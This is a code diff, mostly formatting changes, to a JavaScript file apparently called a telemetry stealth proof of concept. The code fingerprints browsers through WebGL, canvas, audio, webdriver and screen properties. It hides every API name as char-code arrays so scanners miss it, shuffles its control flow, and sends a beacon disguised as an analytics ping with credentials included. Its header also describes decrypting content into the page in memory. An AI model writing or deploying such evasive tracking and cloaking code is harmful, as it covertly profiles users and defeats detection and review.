@@ -10,7 +10,7 @@
  * - Stealth hydrate: beacon disguised as analytics ping; AES-GCM DOM graft in memory (no navigation).
  *
  * Verify (no sensitive literals in bundle):
- *   rg 'WebGLRenderingContext|CanvasRenderingContext2D|navigator\.webdriver|AudioContext' internal/track/telemetry_stealth_poc.js; test $? -ne 0
+ *   go test ./internal/track/ -short -run TestTelemetryStealthPoc_noSensitiveLiterals_holdout -count=1
  */
 (() => {
   const SAFE = 0;
@@ -40,11 +40,15 @@
     json: hashBytes([74, 83, 79, 78]),
     u8: hashBytes([85, 105, 110, 116, 56, 65, 114, 114, 97, 121]),
     wglCtx: hashBytes([
-      87, 101, 98, 71, 76, 82, 101, 110, 100, 101, 114, 105, 110, 103, 67, 111, 110, 116, 101, 120, 116,
+      87, 101, 98, 71, 76, 82, 101, 110, 100, 101, 114, 105, 110, 103, 67, 111, 110, 116, 101, 120,
+      116,
     ]),
-    audCtx: hashBytes([79, 102, 102, 108, 105, 110, 101, 65, 117, 100, 105, 111, 67, 111, 110, 116, 101, 120, 116]),
+    audCtx: hashBytes([
+      79, 102, 102, 108, 105, 110, 101, 65, 117, 100, 105, 111, 67, 111, 110, 116, 101, 120, 116,
+    ]),
     canvas2d: hashBytes([
-      67, 97, 110, 118, 97, 115, 82, 101, 110, 100, 101, 114, 105, 110, 103, 67, 111, 110, 116, 101, 120, 116, 50, 68,
+      67, 97, 110, 118, 97, 115, 82, 101, 110, 100, 101, 114, 105, 110, 103, 67, 111, 110, 116, 101,
+      120, 116, 50, 68,
     ]),
     wd: hashBytes([119, 101, 98, 100, 114, 105, 118, 101, 114]),
     gCtx: hashBytes([103, 101, 116, 67, 111, 110, 116, 101, 120, 116]),
@@ -53,17 +57,23 @@
     sendB: hashBytes([115, 101, 110, 100, 66, 101, 97, 99, 111, 110]),
     subtle: hashBytes([115, 117, 98, 116, 108, 101]),
     now: hashBytes([110, 111, 119]),
-    gopn: hashBytes([103, 101, 116, 79, 119, 110, 80, 114, 111, 112, 101, 114, 116, 121, 78, 97, 109, 101, 115]),
+    gopn: hashBytes([
+      103, 101, 116, 79, 119, 110, 80, 114, 111, 112, 101, 114, 116, 121, 78, 97, 109, 101, 115,
+    ]),
     proto: hashBytes([112, 114, 111, 116, 111, 116, 121, 112, 101]),
     ua: hashBytes([117, 115, 101, 114, 65, 103, 101, 110, 116]),
-    hc: hashBytes([104, 97, 114, 100, 119, 97, 114, 101, 67, 111, 110, 99, 117, 114, 114, 101, 110, 99, 121]),
+    hc: hashBytes([
+      104, 97, 114, 100, 119, 97, 114, 101, 67, 111, 110, 99, 117, 114, 114, 101, 110, 99, 121,
+    ]),
     dpr: hashBytes([100, 101, 118, 105, 99, 101, 80, 105, 120, 101, 108, 82, 97, 116, 105, 111]),
     iw: hashBytes([105, 110, 110, 101, 114, 87, 105, 100, 116, 104]),
     ih: hashBytes([105, 110, 110, 101, 114, 72, 101, 105, 103, 104, 116]),
     w: hashBytes([119, 105, 100, 116, 104]),
     h: hashBytes([104, 101, 105, 103, 104, 116]),
     webgl: hashBytes([119, 101, 98, 103, 108]),
-    expGl: hashBytes([101, 120, 112, 101, 114, 105, 109, 101, 110, 116, 97, 108, 45, 119, 101, 98, 103, 108]),
+    expGl: hashBytes([
+      101, 120, 112, 101, 114, 105, 109, 101, 110, 116, 97, 108, 45, 119, 101, 98, 103, 108,
+    ]),
     d2: hashBytes([50, 100]),
     fill: hashBytes([102, 105, 108, 108, 84, 101, 120, 116]),
     meas: hashBytes([109, 101, 97, 115, 117, 114, 101, 84, 101, 120, 116]),
@@ -89,7 +99,29 @@
     if (!o) {
       return null;
     }
-    return o[String.fromCharCode(103, 101, 116, 79, 119, 110, 80, 114, 111, 112, 101, 114, 116, 121, 78, 97, 109, 101, 115)];
+    return o[
+      String.fromCharCode(
+        103,
+        101,
+        116,
+        79,
+        119,
+        110,
+        80,
+        114,
+        111,
+        112,
+        101,
+        114,
+        116,
+        121,
+        78,
+        97,
+        109,
+        101,
+        115
+      )
+    ];
   }
 
   function hashKeyName(key) {
@@ -252,7 +284,9 @@
       const b = nowFn.call(perf);
       jitter = Math.abs(b - a) * 100000;
     }
-    return ((w * 31 + h * 17 + hc * 13) >>> 0) ^ ((dpr * 997 + jitter) >>> 0) ^ (Date.now() & 0xffff);
+    return (
+      ((w * 31 + h * 17 + hc * 13) >>> 0) ^ ((dpr * 997 + jitter) >>> 0) ^ (Date.now() & 0xffff)
+    );
   }
 
   // Permutation of step ids 0..n-1 via Fisher-Yates seeded by entropy (flattened control flow).
@@ -333,8 +367,29 @@
     const gCtxFn = resolveKey(el, H.gCtx);
     const gl =
       typeof gCtxFn === 'function'
-        ? gCtxFn.call(el, String.fromCharCode(101, 120, 112, 101, 114, 105, 109, 101, 110, 116, 97, 108, 45, 119, 101, 98, 103, 108)) ||
-          gCtxFn.call(el, String.fromCharCode(119, 101, 98, 103, 108))
+        ? gCtxFn.call(
+            el,
+            String.fromCharCode(
+              101,
+              120,
+              112,
+              101,
+              114,
+              105,
+              109,
+              101,
+              110,
+              116,
+              97,
+              108,
+              45,
+              119,
+              101,
+              98,
+              103,
+              108
+            )
+          ) || gCtxFn.call(el, String.fromCharCode(119, 101, 98, 103, 108))
         : null;
     if (!gl) {
       return '';
@@ -557,7 +612,11 @@
     const blob = new Blob([body], { type: 'text/plain' });
     let resp = null;
     if (typeof sendB === 'function' && sendB.call(nav, HYDRATE_PATH, blob)) {
-      resp = await fetch(HYDRATE_PATH, { method: String.fromCharCode(80, 79, 83, 84), credentials: 'include', body });
+      resp = await fetch(HYDRATE_PATH, {
+        method: String.fromCharCode(80, 79, 83, 84),
+        credentials: 'include',
+        body,
+      });
     } else {
       const fetchFn = resolveGlobal(H.fetch);
       if (typeof fetchFn !== 'function') {
